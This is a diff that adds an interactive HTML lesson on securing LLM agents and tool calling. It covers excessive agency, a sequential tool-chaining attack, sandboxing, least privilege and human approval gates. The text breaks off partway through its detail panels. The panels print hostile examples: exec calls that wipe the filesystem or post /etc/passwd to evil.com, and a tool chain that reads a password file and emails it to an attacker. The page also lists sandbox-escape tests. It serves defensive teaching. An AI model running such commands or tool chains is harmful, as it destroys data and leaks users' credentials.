@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ch 8: Securing Agents & Tool Calling — Under the Hood</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 42 42'%3E%3Ccircle cx='21' cy='21' r='19' fill='%231e1b4b'/%3E%3Ccircle cx='21' cy='21' r='16' stroke='%23a5b4fc' stroke-width='1.5' stroke-dasharray='3 3' fill='none' opacity='.45'/%3E%3Ccircle cx='21' cy='12' r='3' fill='%2338bdf8'/%3E%3Ccircle cx='13' cy='26' r='3' fill='%2338bdf8'/%3E%3Ccircle cx='29' cy='26' r='3' fill='%2338bdf8'/%3E%3Ccircle cx='21' cy='21' r='4' fill='%23fff'/%3E%3Cline x1='21' y1='15' x2='21' y2='17' stroke='%23a5b4fc' stroke-width='1.5' stroke-linecap='round'/%3E%3Cline x1='15.4' y1='24.2' x2='17.5' y2='23' stroke='%23a5b4fc' stroke-width='1.5' stroke-linecap='round'/%3E%3Cline x1='26.6' y1='24.2' x2='24.5' y2='23' stroke='%23a5b4fc' stroke-width='1.5' stroke-linecap='round'/%3E%3C/svg%3E">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#f6f7fb;--bg-white:#fff;--bg-muted:#f0f2f7;--border:#dfe3ed;--border-light:#eaedf4;--text-1:#1b2035;--text-2:#505872;--text-3:#8892ab;--blue:#2563eb;--blue-light:#eff6ff;--blue-border:#bfdbfe;--violet:#7c3aed;--violet-light:#ede9fe;--violet-border:#c4b5fd;--pink:#db2777;--pink-light:#fdf2f8;--pink-border:#f9a8d4;--teal:#0d9488;--teal-light:#f0fdfa;--teal-border:#99f6e4;--amber:#d97706;--amber-light:#fffbeb;--amber-border:#fcd34d;--green:#16a34a;--green-light:#f0fdf4;--green-border:#bbf7d0;--red:#dc2626;--red-light:#fef2f2;--red-border:#fecaca;--orange:#ea580c;--orange-light:#fff7ed;--orange-border:#fed7aa;--slate:#64748b;--slate-light:#f1f5f9;--shadow-sm:0 1px 2px rgba(0,0,0,.04);--shadow-md:0 4px 16px rgba(0,0,0,.06);--shadow-lg:0 8px 32px rgba(0,0,0,.08);--radius:12px;--radius-lg:20px}
+*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--text-1);-webkit-font-smoothing:antialiased;min-height:100vh;display:flex;align-items:flex-start;justify-content:center;padding:32px 20px 60px}.material-symbols-rounded{font-variation-settings:'FILL' 0,'wght' 400,'GRAD' 0,'opsz' 24;vertical-align:middle}
+.canvas{width:100%;max-width:1120px;background:var(--bg-white);border:1px solid var(--border);border-radius:var(--radius-lg);box-shadow:var(--shadow-lg);overflow:hidden}
+.title-bar{padding:18px 36px;border-bottom:1px solid var(--border-light);display:flex;align-items:center;gap:12px}.title-bar h2{font-size:16px;font-weight:800;letter-spacing:-.5px}.title-bar .tb-sub{font-size:11px;color:var(--text-3)}.title-bar .tb-tag{font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;color:var(--violet);padding:4px 12px;background:var(--violet-light);border:1px solid var(--violet-border);border-radius:6px;margin-left:auto}
+.tb-nav{display:flex;align-items:center;gap:8px;margin-right:8px}.tb-nav a{font-size:10px;font-weight:600;text-decoration:none;padding:4px 10px;border-radius:6px;transition:all .15s}.tb-nav a.nav-back{color:var(--text-3);background:var(--bg-muted)}.tb-nav a.nav-back:hover{color:var(--text-1);background:var(--border)}.tb-nav a.nav-alt{color:var(--red);background:var(--red-light);border:1px solid var(--red-border)}.tb-nav a.nav-alt:hover{background:var(--red);color:#fff}
+.narration{padding:12px 36px;background:linear-gradient(90deg,var(--green-light) 0%,var(--teal-light) 50%,var(--slate-light) 100%);border-bottom:1px solid var(--border-light);display:flex;align-items:center;gap:14px;min-height:48px;cursor:pointer;transition:background .3s ease}.narration:hover{filter:brightness(.97)}
+.nar-step{width:28px;height:28px;border-radius:50%;background:var(--violet);color:#fff;display:flex;align-items:center;justify-content:center;font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:800;flex-shrink:0;transition:background .4s ease}.nar-text{font-size:12px;font-weight:500;color:var(--text-1);line-height:1.5}.nar-text strong{font-weight:700}.nar-text code{font-family:'JetBrains Mono',monospace;font-size:10px;background:rgba(0,0,0,.05);padding:1px 5px;border-radius:3px}
+.progress-track{height:3px;background:var(--bg-muted);position:relative}.progress-fill{position:absolute;top:0;left:0;height:100%;width:0%;background:linear-gradient(90deg,var(--red),var(--orange),var(--violet),var(--teal));transition:width .5s ease}
+.step-counter{padding:8px 36px;display:flex;align-items:center;gap:12px;background:var(--bg-white);border-bottom:1px solid var(--border-light)}.sc-label{font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:600;letter-spacing:1px;text-transform:uppercase;color:var(--text-3)}.sc-num{font-family:'JetBrains Mono',monospace;font-size:10px;font-weight:700;color:var(--violet);min-width:55px}.sc-dots{display:flex;gap:4px;margin-left:auto}.sc-dot{width:7px;height:7px;border-radius:50%;background:var(--border);transition:all .3s ease}.sc-dot.filled{background:var(--violet);box-shadow:0 0 5px rgba(124,58,237,.3)}
+.zone{padding:22px 32px;border-bottom:1px solid var(--border-light);position:relative}.zone:last-child{border-bottom:none}.zone-head{display:flex;align-items:center;gap:10px;margin-bottom:16px}.zone-tag{padding:3px 10px;border-radius:6px;font-family:'JetBrains Mono',monospace;font-size:8px;font-weight:700;letter-spacing:1.2px;text-transform:uppercase;flex-shrink:0}.zone-title{font-size:12px;font-weight:700}.zone-sub{font-size:10px;color:var(--text-3);margin-left:auto}
+.zone-a{background:linear-gradient(180deg,var(--red-light) 0%,var(--bg-white) 100%)}.zone-a .zone-tag{background:var(--red-light);color:var(--red);border:1px solid var(--red-border)}.zone-a .zone-title{color:var(--red)}
+.zone-b{background:linear-gradient(180deg,var(--orange-light) 0%,var(--bg-white) 100%)}.zone-b .zone-tag{background:var(--orange-light);color:var(--orange);border:1px solid var(--orange-border)}.zone-b .zone-title{color:var(--orange)}
+.zone-c{background:linear-gradient(180deg,var(--violet-light) 0%,var(--bg-white) 100%)}.zone-c .zone-tag{background:var(--violet-light);color:var(--violet);border:1px solid var(--violet-border)}.zone-c .zone-title{color:var(--violet)}
+.zone-d{background:linear-gradient(180deg,var(--blue-light) 0%,var(--bg-white) 100%)}.zone-d .zone-tag{background:var(--blue-light);color:var(--blue);border:1px solid var(--blue-border)}.zone-d .zone-title{color:var(--blue)}
+.zone-e{background:linear-gradient(180deg,var(--teal-light) 0%,var(--bg-white) 100%)}.zone-e .zone-tag{background:var(--teal-light);color:var(--teal);border:1px solid var(--teal-border)}.zone-e .zone-title{color:var(--teal)}
+.flow-row{display:flex;align-items:center;justify-content:center;gap:0;flex-wrap:wrap}
+.fnode{display:flex;flex-direction:column;align-items:center;gap:6px;padding:14px 16px;background:var(--bg-white);border:1.5px solid var(--border);border-radius:var(--radius);min-width:115px;max-width:140px;text-align:center;box-shadow:var(--shadow-sm);transition:all .5s ease;cursor:pointer;position:relative}.fnode:hover{transform:translateY(-2px);box-shadow:var(--shadow-md)}
+.fnode-icon{width:36px;height:36px;border-radius:9px;display:flex;align-items:center;justify-content:center}.fnode-icon .material-symbols-rounded{font-size:20px}.fnode-label{font-size:10px;font-weight:700;letter-spacing:-.1px}.fnode-sub{font-size:8px;color:var(--text-3);line-height:1.4}
+.fnode.c-red .fnode-icon{background:var(--red-light);color:var(--red)}.fnode.c-red .fnode-label{color:var(--red)}.fnode.c-red{border-color:var(--red-border)}.fnode.c-red.active{box-shadow:0 0 0 3px rgba(220,38,38,.15),var(--shadow-md)}
+.fnode.c-orange .fnode-icon{background:var(--orange-light);color:var(--orange)}.fnode.c-orange .fnode-label{color:var(--orange)}.fnode.c-orange{border-color:var(--orange-border)}.fnode.c-orange.active{box-shadow:0 0 0 3px rgba(234,88,12,.15),var(--shadow-md)}
+.fnode.c-violet .fnode-icon{background:var(--violet-light);color:var(--violet)}.fnode.c-violet .fnode-label{color:var(--violet)}.fnode.c-violet{border-color:var(--violet-border)}.fnode.c-violet.active{box-shadow:0 0 0 3px rgba(124,58,237,.15),var(--shadow-md)}
+.fnode.c-blue .fnode-icon{background:var(--blue-light);color:var(--blue)}.fnode.c-blue .fnode-label{color:var(--blue)}.fnode.c-blue{border-color:var(--blue-border)}.fnode.c-blue.active{box-shadow:0 0 0 3px rgba(37,99,235,.15),var(--shadow-md)}
+.fnode.c-teal .fnode-icon{background:var(--teal-light);color:var(--teal)}.fnode.c-teal .fnode-label{color:var(--teal)}.fnode.c-teal{border-color:var(--teal-border)}.fnode.c-teal.active{box-shadow:0 0 0 3px rgba(13,148,136,.15),var(--shadow-md)}
+.fnode.c-green .fnode-icon{background:var(--green-light);color:var(--green)}.fnode.c-green .fnode-label{color:var(--green)}.fnode.c-green{border-color:var(--green-border)}.fnode.c-green.active{box-shadow:0 0 0 3px rgba(22,163,74,.15),var(--shadow-md)}
+.fnode.active{transform:translateY(-2px)}
+.farr{display:flex;align-items:center;width:36px;height:2px;position:relative;margin:0 2px;flex-shrink:0;transition:opacity .5s ease}.farr::before{content:'';position:absolute;inset:0;background:linear-gradient(90deg,var(--border),var(--text-3));border-radius:1px}.farr::after{content:'';position:absolute;right:-2px;top:50%;transform:translateY(-50%);border:4px solid transparent;border-left:5px solid var(--text-3)}
+.loop-conn{display:flex;align-items:center;justify-content:center;gap:12px;padding:6px 32px;background:var(--bg-muted);border-bottom:1px solid var(--border-light);transition:opacity .5s ease}.loop-dash{flex:1;height:1px;background:repeating-linear-gradient(90deg,var(--border) 0 4px,transparent 4px 10px)}.loop-pill{display:flex;align-items:center;gap:6px;padding:4px 14px;background:var(--bg-white);border:1px solid var(--border);border-radius:7px;font-family:'JetBrains Mono',monospace;font-size:8px;font-weight:500;color:var(--text-3);white-space:nowrap;letter-spacing:.3px;transition:all .5s ease}.loop-pill .material-symbols-rounded{font-size:13px}
+.loop-conn.active .loop-pill{background:var(--red-light);border-color:var(--red-border);color:var(--red)}
+.loop-conn.c-orange.active .loop-pill{background:var(--orange-light);border-color:var(--orange-border);color:var(--orange)}
+.loop-conn.c-violet.active .loop-pill{background:var(--violet-light);border-color:var(--violet-border);color:var(--violet)}
+.loop-conn.c-blue.active .loop-pill{background:var(--blue-light);border-color:var(--blue-border);color:var(--blue)}
+.loop-conn.c-teal.active .loop-pill{background:var(--teal-light);border-color:var(--teal-border);color:var(--teal)}
+.step-badge{position:absolute;top:-8px;right:-8px;width:20px;height:20px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:'JetBrains Mono',monospace;font-size:8px;font-weight:800;color:#fff;z-index:10;opacity:0;transform:scale(0);transition:all .4s cubic-bezier(.34,1.56,.64,1);pointer-events:none}
+.loop-conn .step-badge{position:relative;top:auto;right:auto;transform:none;flex-shrink:0;width:20px;height:20px;font-size:8px}
+[data-step].dimmed{opacity:.15;filter:grayscale(.7)}[data-step].active{opacity:1;filter:none}[data-step].active .step-badge{opacity:1;transform:scale(1)}
+.bg-red{background:var(--red)}.bg-orange{background:var(--orange)}.bg-violet{background:var(--violet)}.bg-blue{background:var(--blue)}.bg-teal{background:var(--teal)}.bg-green{background:var(--green)}.bg-pink{background:var(--pink)}.bg-slate{background:var(--slate)}
+.detail-overlay{position:fixed;inset:0;background:rgba(0,0,0,.2);z-index:199;opacity:0;pointer-events:none;transition:opacity .3s ease}.detail-overlay.visible{opacity:1;pointer-events:auto}
+.detail-panel{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) scale(.95);width:660px;max-width:92vw;max-height:82vh;overflow-y:auto;background:var(--bg-white);border:1.5px solid var(--border);border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.15);z-index:200;opacity:0;pointer-events:none;transition:all .3s cubic-bezier(.4,0,.2,1)}.detail-panel.visible{opacity:1;pointer-events:auto;transform:translate(-50%,-50%) scale(1)}
+.dp-head{display:flex;align-items:center;gap:10px;padding:14px 20px;border-bottom:1px solid var(--border-light);position:sticky;top:0;background:var(--bg-white);border-radius:16px 16px 0 0;z-index:1}.dp-step{width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:800;color:#fff;flex-shrink:0}.dp-title{font-size:12px;font-weight:700}.dp-close{margin-left:auto;width:28px;height:28px;border:none;background:var(--bg-muted);border-radius:50%;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:background .15s}.dp-close:hover{background:var(--border)}.dp-close .material-symbols-rounded{font-size:16px;color:var(--text-3)}
+.dp-body{padding:16px 20px 20px}.dp-label{font-family:'JetBrains Mono',monospace;font-size:8px;font-weight:700;letter-spacing:1.2px;text-transform:uppercase;color:var(--text-3);margin-bottom:6px}
+.dp-code{font-family:'JetBrains Mono',monospace;font-size:10px;line-height:1.7;color:var(--text-1);background:var(--bg-muted);border:1px solid var(--border-light);border-radius:8px;padding:12px 14px;margin-bottom:14px;white-space:pre-wrap;word-break:break-word}
+.dp-code .hl-key{color:var(--violet);font-weight:600}.dp-code .hl-str{color:var(--teal)}.dp-code .hl-num{color:var(--amber)}.dp-code .hl-cmt{color:var(--text-3);font-style:italic}.dp-code .hl-cmd{color:var(--pink);font-weight:600}.dp-code .hl-ok{color:var(--green);font-weight:600}.dp-code .hl-err{color:var(--red);font-weight:600}
+.dp-note{font-size:11px;color:var(--text-2);line-height:1.6;padding:10px 14px;border-radius:8px;margin-bottom:14px}
+.dp-note.n-red{background:var(--red-light);border:1px solid var(--red-border)}.dp-note.n-red strong{color:var(--red)}
+.dp-note.n-orange{background:var(--orange-light);border:1px solid var(--orange-border)}.dp-note.n-orange strong{color:var(--orange)}
+.dp-note.n-violet{background:var(--violet-light);border:1px solid var(--violet-border)}.dp-note.n-violet strong{color:var(--violet)}
+.dp-note.n-blue{background:var(--blue-light);border:1px solid var(--blue-border)}.dp-note.n-blue strong{color:var(--blue)}
+.dp-note.n-teal{background:var(--teal-light);border:1px solid var(--teal-border)}.dp-note.n-teal strong{color:var(--teal)}
+.dp-note.n-green{background:var(--green-light);border:1px solid var(--green-border)}.dp-note.n-green strong{color:var(--green)}
+.dp-note:last-child,.dp-code:last-child{margin-bottom:0}
+.controls{position:fixed;bottom:24px;right:24px;display:flex;align-items:center;gap:6px;background:var(--bg-white);border:1.5px solid var(--border);border-radius:28px;padding:5px 6px;box-shadow:var(--shadow-lg);z-index:100}.ctrl-btn{width:36px;height:36px;border-radius:50%;border:none;background:transparent;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .15s;color:var(--text-2)}.ctrl-btn:hover{background:var(--bg-muted);color:var(--text-1)}.ctrl-btn:active{transform:scale(.92)}.ctrl-btn .material-symbols-rounded{font-size:20px}.ctrl-play{width:40px;height:40px;background:var(--violet);color:#fff;border-radius:50%}.ctrl-play:hover{background:#6d28d9;color:#fff}.ctrl-play .material-symbols-rounded{font-size:22px;color:#fff}
+@media(max-width:900px){body{padding:16px 10px 48px}.zone{padding:18px 18px}.narration,.loop-conn{padding:10px 18px}.title-bar,.step-counter{padding:14px 18px}.flow-row{gap:4px}.farr{width:24px}.fnode{min-width:90px;padding:10px 10px}}
+@media(max-width:600px){.flow-row{flex-direction:column;gap:0}.farr{width:2px;height:20px;margin:0}.farr::before{background:var(--border)}.farr::after{right:auto;bottom:-2px;top:auto;left:50%;transform:translateX(-50%);border:4px solid transparent;border-top:5px solid var(--text-3)}.title-bar{flex-direction:column;gap:6px;align-items:flex-start}.title-bar .tb-tag{margin-left:0}.step-counter{flex-wrap:wrap}.tb-nav{margin-right:0}}
+</style>
+</head>
+<body>
+<div class="canvas">
+  <div class="title-bar">
+    <div><h2>Ch 8 &mdash; Securing Agents &amp; Tool Calling &mdash; Under the Hood</h2><span class="tb-sub">Excessive Agency, AgentXploit, STAC, WASM isolation, least privilege, HITL</span></div>
+    <div class="tb-nav"><a class="nav-back" href="index.html">Index</a><a class="nav-alt" href="08-securing-agents-tool-calling-high-level.html">&larr; High Level</a></div>
+    <span class="tb-tag">Under the Hood</span>
+  </div>
+  <div class="narration" id="narration"><div class="nar-step" id="narStep">-</div><div class="nar-text" id="narText">Click play or press Space to begin. Click any node for deep-dive details...</div></div>
+  <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
+  <div class="step-counter"><span class="sc-label">Step</span><span class="sc-num" id="stepLabel">- / 10</span><div class="sc-dots" id="stepDots"></div></div>
+
+  <!-- ZONE A: EXCESSIVE AGENCY & UNSAFE EXECUTION -->
+  <div class="zone zone-a">
+    <div class="zone-head"><span class="zone-tag">A</span><span class="zone-title">Excessive Agency &amp; Unsafe Tool Execution</span><span class="zone-sub">OWASP LLM06:2025 &mdash; too much power, too little control</span></div>
+    <div class="flow-row">
+      <div class="fnode c-red dimmed" data-step="1"><span class="step-badge bg-red">1</span><div class="fnode-icon"><span class="material-symbols-rounded">smart_toy</span></div><span class="fnode-label">Agent Decides</span><span class="fnode-sub">LLM chooses<br>which tool to call</span></div>
+      <div class="farr dimmed" data-step="1"></div>
+      <div class="fnode c-red dimmed" data-step="1"><div class="fnode-icon"><span class="material-symbols-rounded">terminal</span></div><span class="fnode-label">exec() / eval()</span><span class="fnode-sub">Unsafe code<br>execution pattern</span></div>
+      <div class="farr dimmed" data-step="2"></div>
+      <div class="fnode c-red dimmed" data-step="2"><span class="step-badge bg-red">2</span><div class="fnode-icon"><span class="material-symbols-rounded">admin_panel_settings</span></div><span class="fnode-label">Over-Privileged</span><span class="fnode-sub">Full DB access<br>admin credentials</span></div>
+      <div class="farr dimmed" data-step="2"></div>
+      <div class="fnode c-red dimmed" data-step="2"><div class="fnode-icon"><span class="material-symbols-rounded">warning</span></div><span class="fnode-label">No Confirmation</span><span class="fnode-sub">Destructive actions<br>without HITL</span></div>
+    </div>
+  </div>
+
+  <div class="loop-conn c-orange dimmed" data-step="3"><span class="step-badge bg-orange">3</span><div class="loop-dash"></div><span class="loop-pill"><span class="material-symbols-rounded">arrow_downward</span> Attack research: AgentXploit &amp; STAC tool chaining</span><div class="loop-dash"></div></div>
+
+  <!-- ZONE B: ATTACK RESEARCH -->
+  <div class="zone zone-b">
+    <div class="zone-head"><span class="zone-tag">B</span><span class="zone-title">Agent Attack Research</span><span class="zone-sub">AgentXploit, STAC (Sequential Tool Attack Chaining)</span></div>
+    <div class="flow-row">
+      <div class="fnode c-orange dimmed" data-step="3"><div class="fnode-icon"><span class="material-symbols-rounded">bug_report</span></div><span class="fnode-label">AgentXploit</span><span class="fnode-sub">Automated agent<br>vulnerability scanner</span></div>
+      <div class="farr dimmed" data-step="4"></div>
+      <div class="fnode c-orange dimmed" data-step="4"><span class="step-badge bg-orange">4</span><div class="fnode-icon"><span class="material-symbols-rounded">link</span></div><span class="fnode-label">STAC</span><span class="fnode-sub">Sequential Tool<br>Attack Chaining</span></div>
+      <div class="farr dimmed" data-step="4"></div>
+      <div class="fnode c-orange dimmed" data-step="4"><div class="fnode-icon"><span class="material-symbols-rounded">science</span></div><span class="fnode-label">SandboxEscapeBench</span><span class="fnode-sub">Benchmark for<br>sandbox breakouts</span></div>
+    </div>
+  </div>
+
+  <div class="loop-conn c-violet dimmed" data-step="5"><span class="step-badge bg-violet">5</span><div class="loop-dash"></div><span class="loop-pill"><span class="material-symbols-rounded">arrow_downward</span> Defense: sandboxing with WASM &amp; containers</span><div class="loop-dash"></div></div>
+
+  <!-- ZONE C: SANDBOXING -->
+  <div class="zone zone-c">
+    <div class="zone-head"><span class="zone-tag">C</span><span class="zone-title">Sandboxing &amp; Isolation</span><span class="zone-sub">WASM (WebAssembly), gVisor, Firecracker microVMs</span></div>
+    <div class="flow-row">
+      <div class="fnode c-violet dimmed" data-step="5"><div class="fnode-icon"><span class="material-symbols-rounded">deployed_code</span></div><span class="fnode-label">WASM Sandbox</span><span class="fnode-sub">WebAssembly<br>memory isolation</span></div>
+      <div class="farr dimmed" data-step="6"></div>
+      <div class="fnode c-violet dimmed" data-step="6"><span class="step-badge bg-violet">6</span><div class="fnode-icon"><span class="material-symbols-rounded">dns</span></div><span class="fnode-label">Container Isolation</span><span class="fnode-sub">gVisor / Firecracker<br>per-tool sandboxes</span></div>
+      <div class="farr dimmed" data-step="6"></div>
+      <div class="fnode c-violet dimmed" data-step="6"><div class="fnode-icon"><span class="material-symbols-rounded">timer</span></div><span class="fnode-label">Resource Limits</span><span class="fnode-sub">CPU, memory, time<br>network restrictions</span></div>
+    </div>
+  </div>
+
+  <div class="loop-conn c-blue dimmed" data-step="7"><span class="step-badge bg-blue">7</span><div class="loop-dash"></div><span class="loop-pill"><span class="material-symbols-rounded">arrow_downward</span> Least privilege &amp; human-in-the-loop gates</span><div class="loop-dash"></div></div>
+
+  <!-- ZONE D: LEAST PRIVILEGE & HITL -->
+  <div class="zone zone-d">
+    <div class="zone-head"><span class="zone-tag">D</span><span class="zone-title">Least Privilege &amp; Human-in-the-Loop</span><span class="zone-sub">Capability-based access, approval gates for destructive actions</span></div>
+    <div class="flow-row">
+      <div class="fnode c-blue dimmed" data-step="7"><div class="fnode-icon"><span class="material-symbols-rounded">key</span></div><span class="fnode-label">Least Privilege</span><span class="fnode-sub">Minimal permissions<br>per tool</span></div>
+      <div class="farr dimmed" data-step="8"></div>
+      <div class="fnode c-blue dimmed" data-step="8"><span class="step-badge bg-blue">8</span><div class="fnode-icon"><span class="material-symbols-rounded">person_check</span></div><span class="fnode-label">HITL Gates</span><span class="fnode-sub">Human approval<br>for risky actions</span></div>
+      <div class="farr dimmed" data-step="8"></div>
+      <div class="fnode c-blue dimmed" data-step="8"><div class="fnode-icon"><span class="material-symbols-rounded">rule</span></div><span class="fnode-label">Action Policies</span><span class="fnode-sub">Allow/deny/confirm<br>per action type</span></div>
+    </div>
+  </div>
+
+  <div class="loop-conn c-teal dimmed" data-step="9"><span class="step-badge bg-teal">9</span><div class="loop-dash"></div><span class="loop-pill"><span class="material-symbols-rounded">arrow_downward</span> Complete secure agent architecture</span><div class="loop-dash"></div></div>
+
+  <!-- ZONE E: SECURE AGENT STACK -->
+  <div class="zone zone-e">
+    <div class="zone-head"><span class="zone-tag">E</span><span class="zone-title">Secure Agent Architecture</span><span class="zone-sub">End-to-end defense pipeline for agentic systems</span></div>
+    <div class="flow-row">
+      <div class="fnode c-teal dimmed" data-step="9"><div class="fnode-icon"><span class="material-symbols-rounded">monitoring</span></div><span class="fnode-label">Audit Logging</span><span class="fnode-sub">Every tool call<br>logged &amp; traceable</span></div>
+      <div class="farr dimmed" data-step="10"></div>
+      <div class="fnode c-teal dimmed" data-step="10"><span class="step-badge bg-green">10</span><div class="fnode-icon"><span class="material-symbols-rounded">layers</span></div><span class="fnode-label">Defense Stack</span><span class="fnode-sub">Full secure<br>agent pipeline</span></div>
+    </div>
+  </div>
+
+</div>
+
+<!-- DETAIL OVERLAY -->
+<div class="detail-overlay" id="detailOverlay"></div>
+<div class="detail-panel" id="detailPanel">
+  <div class="dp-head"><div class="dp-step" id="dpStep"></div><div class="dp-title" id="dpTitle"></div><button class="dp-close" id="dpClose"><span class="material-symbols-rounded">close</span></button></div>
+  <div class="dp-body" id="dpBody"></div>
+</div>
+
+<div class="controls"><button class="ctrl-btn" id="prevBtn" title="Previous"><span class="material-symbols-rounded">chevron_left</span></button><button class="ctrl-btn ctrl-play" id="playBtn" title="Play / Pause"><span class="material-symbols-rounded" id="playIcon">play_arrow</span></button><button class="ctrl-btn" id="nextBtn" title="Next"><span class="material-symbols-rounded">chevron_right</span></button></div>
+
+<script>
+(function(){
+  const TOTAL=10, STEP_MS=5000;
+  const NARRATION={
+    1:{text:'<strong>Excessive Agency</strong> (OWASP LLM06:2025): The agent has too many tools, too much permission, and too much autonomy. It decides which tool to call based on the LLM\'s reasoning — which can be manipulated via prompt injection. Unsafe patterns like <code>exec()</code> and <code>eval()</code> give the LLM arbitrary code execution.',color:'#dc2626'},
+    2:{text:'<strong>Over-privileged tools:</strong> The database tool has admin credentials. The file tool has write access to the entire filesystem. The email tool can send to any address. No confirmation required for destructive actions. This is the "confused deputy" problem — the agent acts with the developer\'s privileges, not the user\'s.',color:'#dc2626'},
+    3:{text:'<strong>AgentXploit:</strong> Automated vulnerability scanner for LLM agents. Tests for prompt injection → tool abuse chains, privilege escalation, and data exfiltration. Discovers attack paths that manual testing misses by systematically exploring the agent\'s tool surface.',color:'#ea580c'},
+    4:{text:'<strong>STAC</strong> (Sequential Tool Attack Chaining): Attacker chains multiple individually-safe tool calls into a harmful sequence. Example: read_file("passwords.txt") → send_email(attacker, contents). Each tool call looks legitimate in isolation — the harm emerges from the sequence.',color:'#ea580c'},
+    5:{text:'<strong>WASM sandboxing:</strong> WebAssembly provides memory-safe isolation for tool execution. Each tool runs in its own WASM sandbox with no access to the host filesystem, network, or other tools. Linear memory model prevents buffer overflows. Near-native performance.',color:'#7c3aed'},
+    6:{text:'<strong>Container isolation:</strong> gVisor (Google) intercepts syscalls with a user-space kernel. Firecracker (AWS) uses lightweight microVMs — one per tool execution. Both provide stronger isolation than standard containers. Add resource limits: CPU, memory, execution time, network restrictions.',color:'#7c3aed'},
+    7:{text:'<strong>Least privilege:</strong> Each tool gets the minimum permissions needed for its function. The database tool gets read-only access to specific tables. The file tool gets access to one directory. Credentials are scoped and rotated. Never share admin credentials with agent tools.',color:'#2563eb'},
+    8:{text:'<strong>Human-in-the-loop (HITL):</strong> Require human approval for destructive, irreversible, or high-cost actions. Classify actions into tiers: <code>allow</code> (read operations), <code>confirm</code> (write operations), <code>deny</code> (admin operations). The agent pauses and presents the action for approval.',color:'#2563eb'},
+    9:{text:'<strong>Audit logging:</strong> Every tool call must be logged with: timestamp, user identity, tool name, arguments, result, and the LLM reasoning that triggered it. This creates an audit trail for incident response and enables detection of STAC-style chained attacks.',color:'#0d9488'},
+    10:{text:'<strong>Secure agent stack:</strong> Input guardrails (Ch 6) → tool allowlist → least privilege credentials → WASM/container sandbox → HITL gates for destructive actions → output validation → audit logging. Seven layers. The agent is only as secure as its weakest tool.',color:'#16a34a'},
+  };
+
+  const DETAILS={
+    1:{title:'Excessive Agency & Unsafe Execution Patterns',color:'#dc2626',body:`
+<div class="dp-label">The Dangerous exec() Pattern</div>
+<div class="dp-code"><span class="hl-cmt"># UNSAFE: LLM generates code, agent executes it</span>
+
+<span class="hl-key">def</span> code_tool(llm_output):
+    <span class="hl-err">result = exec(llm_output)</span>  <span class="hl-cmt"># NEVER DO THIS</span>
+    <span class="hl-key">return</span> result
+
+<span class="hl-cmt"># The LLM can generate ANY Python code:</span>
+<span class="hl-err">exec("import os; os.system('rm -rf /')")</span>
+<span class="hl-err">exec("import requests; requests.post(
+    'https://evil.com', data=open('/etc/passwd').read()
+)")</span>
+
+<span class="hl-cmt"># ALSO UNSAFE:</span>
+<span class="hl-err">eval(llm_output)</span>         <span class="hl-cmt"># Arbitrary expression</span>
+<span class="hl-err">subprocess.run(llm_output, shell=True)</span>
+<span class="hl-err">os.system(llm_output)</span>    <span class="hl-cmt"># Shell injection</span></div>
+<div class="dp-label">OWASP LLM06:2025 — Excessive Agency</div>
+<div class="dp-code"><span class="hl-cmt"># Three dimensions of Excessive Agency:</span>
+
+<span class="hl-err">1. Excessive Functionality</span>
+   Agent has tools it doesn't need.
+   Email tool available for a Q&A chatbot.
+
+<span class="hl-err">2. Excessive Permissions</span>
+   Tools have more access than required.
+   DB tool has DROP TABLE permission.
+
+<span class="hl-err">3. Excessive Autonomy</span>
+   Agent acts without human confirmation.
+   Sends emails, deletes files, transfers money
+   based solely on LLM reasoning.</div>
+<div class="dp-note n-red"><strong>The core problem:</strong> The LLM is not trustworthy — it can be manipulated via prompt injection (Ch 2), jailbreaking (Ch 3), or indirect injection via RAG (Ch 7). If the agent has powerful tools and no guardrails, any of these attacks becomes a tool-abuse attack. The LLM is the "confused deputy" — it has the developer's privileges but the attacker's instructions.</div>`},
+    4:{title:'STAC: Sequential Tool Attack Chaining',color:'#ea580c',body:`
+<div class="dp-label">Attack Chain Example</div>
+<div class="dp-code"><span class="hl-cmt"># Each tool call looks individually legitimate</span>
+
+<span class="hl-cmt"># Step 1: Reconnaissance (looks like normal query)</span>
+<span class="hl-str">Tool: list_files(directory="/data/users")</span>
+<span class="hl-ok">→ Returns: ["passwords.csv", "emails.csv", ...]</span>
+
+<span class="hl-cmt"># Step 2: Data access (looks like normal read)</span>
+<span class="hl-str">Tool: read_file(path="/data/users/passwords.csv")</span>
+<span class="hl-ok">→ Returns: file contents with credentials</span>
+
+<span class="hl-cmt"># Step 3: Exfiltration (looks like normal email)</span>
+<span class="hl-str">Tool: send_email(
+    to="attacker@evil.com",
+    subject="Report",
+    body=file_contents
+)</span>
+<span class="hl-err">→ Credentials exfiltrated to attacker</span>
+
+<span class="hl-cmt"># No single tool call is malicious.
+# The SEQUENCE is the attack.
+# Traditional per-call validation misses this.</span></div>
+<div class="dp-label">SandboxEscapeBench</div>
+<div class="dp-code"><span class="hl-cmt"># Benchmark for evaluating agent sandbox security</span>
+
+<span class="hl-key">Tests:</span>
+  - File system escape (read outside sandbox)
+  - Network exfiltration (connect to external host)
+  - Process escape (spawn processes outside sandbox)
+  - Privilege escalation (gain root/admin)
+  - Resource exhaustion (DoS the host)
+
+<span class="hl-cmt"># Evaluates isolation technologies:</span>
